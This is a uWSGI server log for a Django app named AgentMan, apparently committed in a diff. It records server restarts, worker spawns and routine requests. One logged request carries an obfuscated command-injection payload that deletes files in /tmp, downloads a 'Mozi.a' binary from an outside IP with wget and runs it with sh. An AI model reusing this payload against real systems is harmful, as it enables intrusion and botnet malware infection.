@@ -1,0 +1,439 @@
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Jan 24 17:12:42 2021] ***
+compiled with version: 8.3.0 on 23 January 2021 12:22:14
+os: Linux-4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11)
+nodename: VM-0-15-debian
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/work/AgentMan
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/work/AgentMan
+your processes number limit is 7343
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on :8008 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:44219 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x55c07e3a0dd0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+['/root/work/AgentMan/static']
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55c07e3a0dd0 pid: 2061 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 2061)
+spawned uWSGI worker 1 (pid: 2067, cores: 1)
+spawned uWSGI worker 2 (pid: 2068, cores: 1)
+spawned uWSGI worker 3 (pid: 2069, cores: 1)
+spawned uWSGI worker 4 (pid: 2070, cores: 1)
+spawned uWSGI worker 5 (pid: 2071, cores: 1)
+spawned uWSGI worker 6 (pid: 2072, cores: 1)
+spawned uWSGI worker 7 (pid: 2073, cores: 1)
+spawned uWSGI worker 8 (pid: 2074, cores: 1)
+spawned uWSGI worker 9 (pid: 2075, cores: 1)
+spawned uWSGI worker 10 (pid: 2076, cores: 1)
+spawned uWSGI http 1 (pid: 2077)
+[pid: 2076|app: 0|req: 1/1] 123.13.93.44 () {38 vars in 1308 bytes} [Sun Jan 24 17:14:20 2021] GET / => generated 231 bytes in 48 msecs (HTTP/1.1 200) 5 headers in 166 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 2067|app: 0|req: 1/2] 123.13.93.44 () {38 vars in 1275 bytes} [Sun Jan 24 17:14:20 2021] GET /favicon.ico => generated 2582 bytes in 27 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 2076|app: 0|req: 2/3] 123.13.93.44 () {38 vars in 1307 bytes} [Sun Jan 24 17:18:43 2021] GET / => generated 231 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 166 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 2069|app: 0|req: 1/4] 123.13.93.44 () {38 vars in 1274 bytes} [Sun Jan 24 17:18:43 2021] GET /favicon.ico => generated 2582 bytes in 18 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /login]
+[pid: 2076|app: 0|req: 3/5] 123.13.93.44 () {38 vars in 1319 bytes} [Sun Jan 24 17:18:48 2021] GET /login] => generated 2569 bytes in 8 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 2076|app: 0|req: 4/6] 123.13.93.44 () {38 vars in 1317 bytes} [Sun Jan 24 17:18:51 2021] GET /login => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 0)
+[pid: 2070|app: 0|req: 1/7] 123.13.93.44 () {38 vars in 1320 bytes} [Sun Jan 24 17:18:51 2021] GET /login/ => generated 2617 bytes in 23 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /static/js/dmaku.js
+Not Found: /static/css/all.min.css
+[pid: 2069|app: 0|req: 2/8] 123.13.93.44 () {38 vars in 1284 bytes} [Sun Jan 24 17:18:51 2021] GET /static/js/dmaku.js => generated 2603 bytes in 11 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 2076|app: 0|req: 5/9] 123.13.93.44 () {38 vars in 1307 bytes} [Sun Jan 24 17:18:51 2021] GET /static/css/all.min.css => generated 2615 bytes in 13 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/css/dmaku.css
+[pid: 2072|app: 0|req: 1/10] 123.13.93.44 () {38 vars in 1303 bytes} [Sun Jan 24 17:18:51 2021] GET /static/css/dmaku.css => generated 2609 bytes in 23 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/img/favicon.ico
+[pid: 2076|app: 0|req: 6/11] 123.13.93.44 () {38 vars in 1303 bytes} [Sun Jan 24 17:18:52 2021] GET /static/img/favicon.ico => generated 2615 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/img/favion.ico
+[pid: 2076|app: 0|req: 7/12] 123.13.93.44 () {38 vars in 1350 bytes} [Sun Jan 24 17:19:42 2021] GET /static/img/favion.ico => generated 2612 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/img/favoicon.ico
+[pid: 2076|app: 0|req: 8/13] 123.13.93.44 () {38 vars in 1354 bytes} [Sun Jan 24 17:19:49 2021] GET /static/img/favoicon.ico => generated 2618 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Jan 24 17:23:32 2021] ***
+compiled with version: 8.3.0 on 23 January 2021 12:22:14
+os: Linux-4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11)
+nodename: VM-0-15-debian
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/work/AgentMan
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/work/AgentMan
+your processes number limit is 7343
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (:8008).
+bind(): Address already in use [core/socket.c line 769]
+[pid: 2076|app: 0|req: 9/14] 123.13.93.44 () {38 vars in 1308 bytes} [Sun Jan 24 17:23:41 2021] GET / => generated 231 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 166 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 2067|app: 0|req: 2/15] 123.13.93.44 () {38 vars in 1275 bytes} [Sun Jan 24 17:23:41 2021] GET /favicon.ico => generated 2582 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 2076|app: 0|req: 10/16] 123.13.93.44 () {38 vars in 1320 bytes} [Sun Jan 24 17:23:45 2021] GET /login/ => generated 2617 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /static/css/dmaku.css
+Not Found: /static/css/all.min.css
+[pid: 2072|app: 0|req: 2/17] 123.13.93.44 () {38 vars in 1303 bytes} [Sun Jan 24 17:23:45 2021] GET /static/css/dmaku.css => generated 2609 bytes in 9 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 2067|app: 0|req: 3/18] 123.13.93.44 () {38 vars in 1307 bytes} [Sun Jan 24 17:23:45 2021] GET /static/css/all.min.css => generated 2615 bytes in 15 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/js/dmaku.js
+[pid: 2071|app: 0|req: 1/19] 123.13.93.44 () {38 vars in 1284 bytes} [Sun Jan 24 17:23:45 2021] GET /static/js/dmaku.js => generated 2603 bytes in 19 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/css/all.min.css
+[pid: 2076|app: 0|req: 11/20] 123.13.93.44 () {38 vars in 1307 bytes} [Sun Jan 24 17:23:49 2021] GET /static/css/all.min.css => generated 2615 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/css/dmaku.css
+[pid: 2067|app: 0|req: 4/21] 123.13.93.44 () {38 vars in 1303 bytes} [Sun Jan 24 17:23:49 2021] GET /static/css/dmaku.css => generated 2609 bytes in 6 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/js/dmaku.js
+[pid: 2076|app: 0|req: 12/22] 123.13.93.44 () {38 vars in 1284 bytes} [Sun Jan 24 17:23:49 2021] GET /static/js/dmaku.js => generated 2603 bytes in 6 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 2076|app: 0|req: 13/23] 123.13.93.44 () {38 vars in 1307 bytes} [Sun Jan 24 17:39:10 2021] GET / => generated 231 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 166 bytes (1 switches on core 0)
+[pid: 2076|app: 0|req: 14/24] 123.13.93.44 () {38 vars in 1319 bytes} [Sun Jan 24 17:39:13 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /static/css/all.min.css
+[pid: 2067|app: 0|req: 5/25] 123.13.93.44 () {38 vars in 1306 bytes} [Sun Jan 24 17:39:13 2021] GET /static/css/all.min.css => generated 2615 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/js/dmaku.js
+[pid: 2069|app: 0|req: 3/26] 123.13.93.44 () {38 vars in 1283 bytes} [Sun Jan 24 17:39:13 2021] GET /static/js/dmaku.js => generated 2603 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /static/css/dmaku.css
+[pid: 2075|app: 0|req: 1/27] 123.13.93.44 () {38 vars in 1302 bytes} [Sun Jan 24 17:39:13 2021] GET /static/css/dmaku.css => generated 2609 bytes in 22 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 2076|app: 0|req: 15/28] 123.13.93.44 () {38 vars in 1320 bytes} [Sun Jan 24 17:39:13 2021] GET /indexApp/static/img/favicon.ico => generated 2642 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Jan 24 18:08:18 2021] ***
+compiled with version: 8.3.0 on 23 January 2021 12:22:14
+os: Linux-4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11)
+nodename: VM-0-15-debian
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/work/AgentMan
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/work/AgentMan
+your processes number limit is 7343
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (:8008).
+bind(): Address already in use [core/socket.c line 769]
+gateway "uWSGI http 1" has been buried (pid: 2077)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 7 buried after 1 seconds
+worker 8 buried after 1 seconds
+worker 9 buried after 1 seconds
+worker 10 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/work/AgentMan
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:44219)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Jan 24 18:09:17 2021] ***
+compiled with version: 8.3.0 on 23 January 2021 12:22:14
+os: Linux-4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11)
+nodename: VM-0-15-debian
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/work/AgentMan
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/work/AgentMan
+your processes number limit is 7343
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address :8008 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x5626808db310
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5626808db310 pid: 2061 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 2061)
+spawned uWSGI worker 1 (pid: 14017, cores: 1)
+spawned uWSGI worker 2 (pid: 14018, cores: 1)
+spawned uWSGI worker 3 (pid: 14019, cores: 1)
+spawned uWSGI worker 4 (pid: 14020, cores: 1)
+spawned uWSGI worker 5 (pid: 14021, cores: 1)
+spawned uWSGI worker 6 (pid: 14022, cores: 1)
+spawned uWSGI worker 7 (pid: 14023, cores: 1)
+spawned uWSGI worker 8 (pid: 14024, cores: 1)
+spawned uWSGI worker 9 (pid: 14025, cores: 1)
+spawned uWSGI worker 10 (pid: 14026, cores: 1)
+...brutally killing workers...
+Gracefully killing worker 2 (pid: 14018)...
+Gracefully killing worker 6 (pid: 14022)...
+Gracefully killing worker 10 (pid: 14026)...
+Gracefully killing worker 4 (pid: 14020)...
+Gracefully killing worker 5 (pid: 14021)...
+Gracefully killing worker 9 (pid: 14025)...
+Gracefully killing worker 3 (pid: 14019)...
+Gracefully killing worker 1 (pid: 14017)...
+Gracefully killing worker 7 (pid: 14023)...
+Gracefully killing worker 8 (pid: 14024)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 7 buried after 1 seconds
+worker 8 buried after 1 seconds
+worker 9 buried after 1 seconds
+worker 10 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/work/AgentMan
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (:8008)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Jan 24 18:09:29 2021] ***
+compiled with version: 8.3.0 on 23 January 2021 12:22:14
+os: Linux-4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11)
+nodename: VM-0-15-debian
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/work/AgentMan
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/work/AgentMan
+your processes number limit is 7343
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address :8008 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x559dd05ee310
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x559dd05ee310 pid: 2061 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 2061)
+spawned uWSGI worker 1 (pid: 14197, cores: 1)
+spawned uWSGI worker 2 (pid: 14198, cores: 1)
+spawned uWSGI worker 3 (pid: 14199, cores: 1)
+spawned uWSGI worker 4 (pid: 14200, cores: 1)
+spawned uWSGI worker 5 (pid: 14201, cores: 1)
+spawned uWSGI worker 6 (pid: 14202, cores: 1)
+spawned uWSGI worker 7 (pid: 14203, cores: 1)
+spawned uWSGI worker 8 (pid: 14204, cores: 1)
+spawned uWSGI worker 9 (pid: 14205, cores: 1)
+spawned uWSGI worker 10 (pid: 14206, cores: 1)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Jan 24 18:10:32 2021] ***
+compiled with version: 8.3.0 on 23 January 2021 12:22:14
+os: Linux-4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11)
+nodename: VM-0-15-debian
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/work/AgentMan
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/work/AgentMan
+your processes number limit is 7343
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address :8008 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x55ee9164f5a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55ee9164f5a0 pid: 1765 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1765)
+spawned uWSGI worker 1 (pid: 1768, cores: 1)
+spawned uWSGI worker 2 (pid: 1769, cores: 1)
+spawned uWSGI worker 3 (pid: 1770, cores: 1)
+spawned uWSGI worker 4 (pid: 1771, cores: 1)
+spawned uWSGI worker 5 (pid: 1772, cores: 1)
+spawned uWSGI worker 6 (pid: 1773, cores: 1)
+spawned uWSGI worker 7 (pid: 1774, cores: 1)
+spawned uWSGI worker 8 (pid: 1775, cores: 1)
+spawned uWSGI worker 9 (pid: 1776, cores: 1)
+spawned uWSGI worker 10 (pid: 1777, cores: 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1768|app: 0|req: 1/1] 123.13.93.44 () {42 vars in 1429 bytes} [Sun Jan 24 18:17:35 2021] GET / => generated 231 bytes in 46 msecs (HTTP/1.1 200) 5 headers in 166 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1777|app: 0|req: 1/2] 123.13.93.44 () {42 vars in 1396 bytes} [Sun Jan 24 18:17:35 2021] GET /favicon.ico => generated 2582 bytes in 43 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /index.html
+[pid: 1768|app: 0|req: 2/3] 123.13.93.44 () {42 vars in 1449 bytes} [Sun Jan 24 18:17:41 2021] GET /index.html => generated 2579 bytes in 8 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 3/4] 123.13.93.44 () {42 vars in 1439 bytes} [Sun Jan 24 18:17:44 2021] GET /login => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 0)
+[pid: 1777|app: 0|req: 2/5] 123.13.93.44 () {42 vars in 1441 bytes} [Sun Jan 24 18:17:44 2021] GET /login/ => generated 2626 bytes in 11 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1768|app: 0|req: 4/6] 123.13.93.44 () {42 vars in 1442 bytes} [Sun Jan 24 18:17:44 2021] GET /indexApp/static/img/favicon.ico => generated 2642 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 5/7] 123.13.93.44 () {42 vars in 1437 bytes} [Sun Jan 24 18:18:17 2021] GET /login/ => generated 2626 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1775|app: 0|req: 1/8] 123.13.93.44 () {42 vars in 1436 bytes} [Sun Jan 24 18:18:17 2021] GET /indexApp/static/img/favicon.ico => generated 2640 bytes in 19 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 6/9] 123.13.93.44 () {46 vars in 1490 bytes} [Sun Jan 24 18:18:25 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1777|app: 0|req: 3/10] 123.13.93.44 () {46 vars in 1489 bytes} [Sun Jan 24 18:18:25 2021] GET /indexApp/static/img/favicon.ico => generated 2640 bytes in 6 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 7/11] 123.13.93.44 () {42 vars in 1437 bytes} [Sun Jan 24 18:18:31 2021] GET /login/ => generated 2626 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1777|app: 0|req: 4/12] 123.13.93.44 () {42 vars in 1436 bytes} [Sun Jan 24 18:18:31 2021] GET /indexApp/static/img/favicon.ico => generated 2640 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 8/13] 123.13.93.44 () {46 vars in 1490 bytes} [Sun Jan 24 18:18:40 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1773|app: 0|req: 1/14] 123.13.93.44 () {46 vars in 1489 bytes} [Sun Jan 24 18:18:40 2021] GET /indexApp/static/img/favicon.ico => generated 2640 bytes in 19 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1768|app: 0|req: 9/15] 123.13.93.44 () {42 vars in 1487 bytes} [Sun Jan 24 18:18:59 2021] GET /indexApp/static/img/favicon.ico => generated 2640 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http:/58.255.82.63:56061/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+[pid: 1768|app: 0|req: 10/16] 58.255.82.63 () {26 vars in 562 bytes} [Sun Jan 24 18:19:02 2021] GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://58.255.82.63:56061/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js => generated 3072 bytes in 4 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1768|app: 0|req: 11/17] 123.13.93.44 () {42 vars in 1412 bytes} [Sun Jan 24 18:19:03 2021] GET /favicon.ico => generated 2580 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1768|app: 0|req: 12/18] 123.13.93.44 () {44 vars in 1443 bytes} [Sun Jan 24 18:20:58 2021] GET /favicon.ico => generated 2580 bytes in 3 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /login/aaa
+[pid: 1768|app: 0|req: 13/19] 123.13.93.44 () {42 vars in 1443 bytes} [Sun Jan 24 18:21:27 2021] GET /login/aaa => generated 2574 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /bbb.jpg
+[pid: 1768|app: 0|req: 14/20] 123.13.93.44 () {42 vars in 1439 bytes} [Sun Jan 24 18:21:32 2021] GET /bbb.jpg => generated 2568 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /1.html
+[pid: 1768|app: 0|req: 15/21] 123.13.93.44 () {42 vars in 1437 bytes} [Sun Jan 24 18:21:54 2021] GET /1.html => generated 2565 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 16/22] 172.104.67.101 () {32 vars in 400 bytes} [Sun Jan 24 18:24:36 2021] GET / => generated 231 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 166 bytes (1 switches on core 0)
+Not Found: /1.html
+[pid: 1768|app: 0|req: 17/23] 123.13.93.44 () {44 vars in 1468 bytes} [Sun Jan 24 18:24:41 2021] GET /1.html => generated 2565 bytes in 3 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1777|app: 0|req: 5/24] 123.13.93.44 () {44 vars in 1427 bytes} [Sun Jan 24 18:24:41 2021] GET /favicon.ico => generated 2580 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 18/25] 123.13.93.44 () {44 vars in 1468 bytes} [Sun Jan 24 18:24:48 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 19/26] 123.13.93.44 () {46 vars in 1490 bytes} [Sun Jan 24 18:24:49 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1777|app: 0|req: 6/27] 123.13.93.44 () {46 vars in 1489 bytes} [Sun Jan 24 18:24:49 2021] GET /indexApp/static/img/favicon.ico => generated 2640 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 20/28] 123.13.93.44 () {46 vars in 1490 bytes} [Sun Jan 24 18:24:50 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
